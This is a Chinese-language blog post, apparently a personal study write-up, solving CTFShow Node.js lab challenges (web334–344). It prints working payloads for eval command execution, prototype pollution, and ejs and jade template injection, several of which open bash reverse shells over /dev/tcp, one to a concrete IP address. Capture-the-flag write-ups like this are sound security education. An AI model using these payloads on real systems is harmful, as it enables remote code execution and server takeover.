@@ -1,0 +1,414 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>CTFShow NodeJS Part | skkyblu3</title>
+<link rel="shortcut icon" href="https://skyblu3519.github.io/favicon.ico?v=1721054258675">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://skyblu3519.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="CTFShow NodeJS Part | skkyblu3 - Atom Feed" href="https://skyblu3519.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="Nodejs学习
+参考链接
+NodeJs从零到原型链污染
+Node.js 常见漏洞学习与总结
+继承与原型链
+深入理解 JavaScript Prototype 污染攻击
+Node.js 原型污染攻击的分析与利用
+CTFShow-nodejs..." />
+    <meta name="keywords" content="nodejs,学习笔记,CTF" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://skyblu3519.github.io">
+  <img class="avatar" src="https://skyblu3519.github.io/images/avatar.png?v=1721054258675" alt="">
+  </a>
+  <h1 class="site-title">
+    skkyblu3
+  </h1>
+  <p class="site-description">
+    Welcome to Internet
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              CTFShow NodeJS Part
+            </h2>
+            <div class="post-info">
+              <span>
+                2023-07-23
+              </span>
+              <span>
+                9 min read
+              </span>
+              
+                <a href="https://skyblu3519.github.io/tag/Sk82FrMEE/" class="post-tag">
+                  # nodejs
+                </a>
+              
+                <a href="https://skyblu3519.github.io/tag/SBvbIXKgV/" class="post-tag">
+                  # 学习笔记
+                </a>
+              
+                <a href="https://skyblu3519.github.io/tag/b7GKYdjmj/" class="post-tag">
+                  # CTF
+                </a>
+              
+            </div>
+            
+              <img class="post-feature-image" src="https://skyblu3519.github.io/post-images/ctfshow-nodejs-part.png" alt="">
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <p>Nodejs学习</p>
+<h1 id="参考链接">参考链接</h1>
+<p><a href="http://blog.m1kael.cn/index.php/archives/27/">NodeJs从零到原型链污染</a><br>
+<a href="https://xz.aliyun.com/t/7184">Node.js 常见漏洞学习与总结</a><br>
+<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Inheritance_and_the_prototype_chain#%E5%9F%BA%E4%BA%8E%E5%8E%9F%E5%9E%8B%E9%93%BE%E7%9A%84%E7%BB%A7%E6%89%BF">继承与原型链</a><br>
+<a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html#0x01-prototype__proto__">深入理解 JavaScript Prototype 污染攻击</a><br>
+<a href="https://xz.aliyun.com/t/4229">Node.js 原型污染攻击的分析与利用</a></p>
+<h1 id="ctfshow-nodejs334-344">CTFShow-nodejs（334-344）</h1>
+<h2 id="web334">web334</h2>
+<p>学习下nodejs的语法知识，没有特别好说的<code>username=CTFSHOw&amp;password=123456</code></p>
+<h2 id="web335">web335</h2>
+<p>F12提示eval代码执行，使用<code>/?eval=2*2</code>测试，结果直接回显。</p>
+<p>在执行系统命令方面，js中使用的是<code>child_process</code>这个模块。这个模块有异步和同步两种创建子进程的方式。</p>
+<p>异步API：</p>
+<ul>
+<li>exec(cmd, options, callback)</li>
+<li>execFile(cmd, args, options, callback)</li>
+<li>fork (模块路径, args, options) // 不一样的地方在于可以通信</li>
+<li>spawn(cmd, args, options)</li>
+</ul>
+<p>同步api:</p>
+<ul>
+<li>execSync</li>
+<li>execFileSync</li>
+<li>spawnSync</li>
+</ul>
+<p>记一下同步API的用法：</p>
+<pre><code class="language-javascript">const ret = cp.execSync('ls -al|grep node_modules') // 用的比较多，对脚本安全性没有校验
+// 可以直接拿到结果
+console.log(ret.toString())
+const ret2 = cp.execFileSync('ls', ['-al'])
+console.log(ret2.toString)
+const ret3 = cp.spawnSync('ls', ['-al'])
+console.log(ret3.stdout.toString()) // 返回的是一个对象
+</code></pre>
+<p>payload：<code>/?eval=require(&quot;child_process&quot;).execSync(&quot;cat fl00g.txt&quot;).toString()</code></p>
+<h2 id="web336">web336</h2>
+<p>和上面一样要eval执行命令，不同的是过滤了&quot;exec&quot;。</p>
+<p>使用spawnSync来做，<code>require(&quot;child_process&quot;).spawnSync('ls').stdout.toString()</code></p>
+<p>注意spawnSync在执行的命令含多个参数的使用方式，最后的payload：<code>/?eval=require(&quot;child_process&quot;).spawnSync(&quot;cat&quot;,[&quot;fl001g.txt&quot;]).stdout.toString()</code></p>
+<p>看了下WP这里还可以用<code>+</code>绕过，或者使用<code>fs</code>模块读取：</p>
+<pre><code class="language-javascript">require('child_process')['exe'+'cSync']('ls').toString() 
+eval=require('fs').readFileSync('fl001g.txt','utf-8')
+</code></pre>
+<h2 id="web337">web337</h2>
+<p>题目介绍直接给了源码</p>
+<pre><code class="language-javascript">var express = require('express');
+var router = express.Router();
+var crypto = require('crypto');
+
+function md5(s) {
+  return crypto.createHash('md5')
+    .update(s)
+    .digest('hex');
+}
+
+/* GET home page. */
+router.get('/', function(req, res, next) {
+  res.type('html');
+  var flag='xxxxxxx';
+  var a = req.query.a;
+  var b = req.query.b;
+  if(a &amp;&amp; b &amp;&amp; a.length===b.length &amp;&amp; a!==b &amp;&amp; md5(a+flag)===md5(b+flag)){
+  	res.end(flag);
+  }else{
+  	res.render('index',{ msg: 'tql'});
+  }
+  
+});
+
+module.exports = router;
+</code></pre>
+<p>使用的方式为数组绕过，paylaod：<code>/?a[x]=1&amp;b[x]=2</code></p>
+<p>由于JavaScript中的对象不能直接和字符串进行加法运算。当试图将对象转化为字符串时，JavaScript 默认会调用对象的 toString() 方法。对于普通的 JavaScript 对象，toString() 方法会返回 &quot;[object Object]&quot;。</p>
+<p>举个例子：</p>
+<pre><code class="language-javascript">&gt; a={'a':'1'}
+&gt; a+&quot;123&quot;
+'[object Object]123'
+</code></pre>
+<p>所以上面的<code>a+flag</code>和<code>b+flag</code>的结果都是'[object Object]flag{xxxx}'，因此md5计算的结果也就想等了。</p>
+<h2 id="web338">web338</h2>
+<p>终于到原型链了。</p>
+<p>关注源码中路由实现的部分，其中login.js</p>
+<pre><code class="language-javascript">var express = require('express');
+var router = express.Router();
+var utils = require('../utils/common');
+
+
+
+/* GET home page.  */
+router.post('/', require('body-parser').json(),function(req, res, next) {
+  res.type('html');
+  var flag='flag_here';
+  var secert = {};
+  var sess = req.session;
+  let user = {};
+  utils.copy(user,req.body);
+  if(secert.ctfshow==='36dboy'){
+    res.end(flag);
+  }else{
+    return res.json({ret_code: 2, ret_msg: '登录失败'+JSON.stringify(user)});  
+  }
+  
+  
+});
+
+module.exports = router;
+</code></pre>
+<p>这里要让<code>secert.ctfshow==='36dboy'</code>，但是secert是一个空对象，并没有ctfshow这个属性。不过<code>utils.copy(user,req.body);</code>执行了一个对象拷贝的操作，这也是原型链攻击的点。</p>
+<p>关于这个原型链自己做才发现污染的方式是添加属性，不是直接令原型为一个对象。</p>
+<pre><code class="language-javascript">// 错误的
+&gt; o1 = {}
+{}
+&gt; o2  = {}
+{}
+&gt; o1.__proto__ = {&quot;a&quot;:1}
+{ a: 1 }
+&gt; o2.a
+undefined
+
+// 正确的
+&gt; o1 = {}
+{}
+&gt; o2 = {}
+{}
+&gt; o1.__proto__.a = 1
+1
+&gt; o2.a
+1
+&gt; o2.__proto__
+[Object: null prototype] { a: 1 }
+</code></pre>
+<p>payload：<code>{&quot;__proto__&quot;:{&quot;ctfshow&quot;:&quot;36dboy&quot;}}</code></p>
+<h2 id="web339">web339</h2>
+<p>这道题和上一题的区别是<code>secert.ctfshow</code>要等于<code>flag</code>，而flag未知，所以无法直接修改ctfshow属性。</p>
+<p>api.js有<code>res.render('api', { query: Function(query)(query)});</code>，这里的<code>Function(query)(query)</code>是一个立即调用的函数表达式（IIFE）。其中，Function 是一个内置的构造函数，用于创建新的函数对象。</p>
+<p>这里面<code>Function(query)</code>创建了一个新的函数，然后这个新创建的函数被立即调用，并将 query 作为参数传入。举个例子：</p>
+<pre><code class="language-javascript">&gt; Function(&quot;return 1+1&quot;)(&quot;return 1+1&quot;)
+2
+</code></pre>
+<p>我们可以利用这一点反弹的shell。</p>
+<p>虽然题目中的query是没有定义的，但是由于js在寻找变量时会在原型链上找，而所有对象都直接或间接基础于<code>Object.prototype</code>。所以在链上添加一个query属性，依然可以被访问到：</p>
+<pre><code class="language-javascript">&gt; o1 = {}
+{}
+&gt; o1.__proto__.a = 1
+1
+&gt; a
+1
+</code></pre>
+<p>解题流程，在/login处修改原型链，payload：</p>
+<pre><code class="language-json">{
+  &quot;username&quot;:&quot;admin&quot;,
+  &quot;password&quot;:&quot;admin&quot;,
+  &quot;__proto__&quot;:{
+    &quot;query&quot;:&quot;return global.process.mainModule.constructor._load('child_process').exec('bash -c \&quot;bash -i &gt;&amp; /dev/tcp/IP/8888 0&gt;&amp;1\&quot;')&quot;
+  }
+}
+</code></pre>
+<p>解释一下，<code>global.process.mainModule.constructor._load:</code> Node.js 中的 global 对象是全局的命名空间，即它的属性是全局作用域中的所有变量。<code>global.process</code> 返回一个对象，表示 Node.js 进程，<code>mainModule</code> 属性则是对当前 Node.js 进程主模块的引用，<code>constructor</code> 属性引用了该模块的构造函数（即 Module），<code>_load</code> 则是 Module 构造函数的一个方法，它的功能是加载一个模块。</p>
+<p>ps.这里无法使用require是因为Function环境下没有require函数。</p>
+<p>用POST方法访问<code>/api</code>触发api.js中路由的规则，反弹shell，读取文件，getshell<br>
+<img src="https://skyblu3519.github.io/post-images/1690121234736.png" alt="" loading="lazy"></p>
+<h2 id="web340">web340</h2>
+<p>这题与上面的不同点，index.js<br>
+<img src="https://skyblu3519.github.io/post-images/1690121264768.png" alt="" loading="lazy"></p>
+<p>这里的<code>isAdmin</code>属性是无法覆盖的，所以利用点还是在api.js中的<code>Function(query)(query)</code>。因为copy的对象是<code>user.userinfo</code>它的原型（所继承的对象）是一个函数，所以要用两个<code>__proto__</code>才能指向<code>Object.prototype</code>。<br>
+<img src="https://skyblu3519.github.io/post-images/1690121275287.png" alt="" loading="lazy"></p>
+<p>因此payload构造</p>
+<pre><code class="language-javascript">{
+  &quot;__proto__&quot;:{
+    &quot;__proto__&quot;:{
+      &quot;query&quot;:&quot;return global.process.mainModule.constructor._load('child_process').exec('bash -c \&quot;bash -i &gt;&amp; /dev/tcp/IP/8888 0&gt;&amp;1\&quot;')&quot;
+    }
+  }
+}
+</code></pre>
+<h2 id="web341">web341</h2>
+<p>这道题和上面的相比没了api.js，可以利用的点就只有<br>
+<img src="https://skyblu3519.github.io/post-images/1690121295672.png" alt="" loading="lazy"></p>
+<p>根据package.json的版本信息可以知道<code>&quot;ejs&quot;: &quot;^3.1.5&quot;</code>，考点：ejs模板引擎rce，原理之后再看，先跟着打一遍。</p>
+<p>payload为：</p>
+<pre><code class="language-javascript">{&quot;__proto__&quot;:{&quot;__proto__&quot;:{&quot;outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require('child_process').exec('bash -c \&quot;bash -i &gt;&amp; /dev/tcp/vps-ip/port 0&gt;&amp;1\&quot;');var __tmp2&quot;}}}
+</code></pre>
+<p>在环境变量中找到flag<br>
+<img src="https://skyblu3519.github.io/post-images/1690121314802.png" alt="" loading="lazy"></p>
+<h2 id="web342-343">web342-343</h2>
+<p>jade 模板rce，直接打吧</p>
+<p>payload：</p>
+<pre><code class="language-javascript">{&quot;__proto__&quot;:{&quot;__proto__&quot;:{&quot;type&quot;:&quot;Code&quot;,&quot;self&quot;:1,&quot;line&quot;:&quot;global.process.mainModule.require('child_process').execSync('bash -c \&quot;bash -i &gt;&amp; /dev/tcp/47.115.227.70/8888 0&gt;&amp;1\&quot;')&quot;}}}
+</code></pre>
+<p>flag在环境变量里。</p>
+<h2 id="web344">web344</h2>
+<p>源码</p>
+<pre><code class="language-javascript">router.get('/', function(req, res, next) {
+  res.type('html');
+  var flag = 'flag_here';
+  if(req.url.match(/8c|2c|\,/ig)){
+  	res.end('where is flag :)');
+  }
+  var query = JSON.parse(req.query.query);
+  if(query.name==='admin'&amp;&amp;query.password==='ctfshow'&amp;&amp;query.isVIP===true){
+  	res.end(flag);
+  }else{
+  	res.end('where is flag. :)');
+  }
+
+});
+</code></pre>
+<p>需要传入一个JSON去解析，但是过滤了逗号。</p>
+<p>绕过方法是传入多个<code>query</code>参数，比如<code>?query=1&amp;query=2&amp;query=3</code>。nodejs在解析这样的参数时，不会用后面的值去覆盖前面的，而是将其作为一个数组保存。</p>
+<p>使用这种方式去绕过逗号，payload为<code>/?query={&quot;name&quot;:&quot;admin&quot;&amp;query=&quot;password&quot;:&quot;ctfshow&quot;&amp;query=&quot;isVIP&quot;:true}</code>，它会被解析为数组<code>['{&quot;name&quot;:&quot;admin&quot;', '&quot;password&quot;:&quot;ctfshow&quot;', '&quot;isVIP&quot;:true}']</code>。这里我猜测，JSON.parse()在解析数组的时候，会调用数组对象的<code>toString</code>方法，而数组对象的<code>toString</code>方法会将里面的元素用逗号连接为一个字符串，所以会被正常解析为JSON。<br>
+<img src="https://skyblu3519.github.io/post-images/1690121331536.png" alt="" loading="lazy"></p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5">参考链接</a></li>
+<li><a href="#ctfshow-nodejs334-344">CTFShow-nodejs（334-344）</a>
+<ul>
+<li><a href="#web334">web334</a></li>
+<li><a href="#web335">web335</a></li>
+<li><a href="#web336">web336</a></li>
+<li><a href="#web337">web337</a></li>
+<li><a href="#web338">web338</a></li>
+<li><a href="#web339">web339</a></li>
+<li><a href="#web340">web340</a></li>
+<li><a href="#web341">web341</a></li>
+<li><a href="#web342-343">web342-343</a></li>
+<li><a href="#web344">web344</a></li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://skyblu3519.github.io/post/yi-zhou-ctflu/">
+              <h3 class="post-title">
+                一周CTF（陆）
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://skyblu3519.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
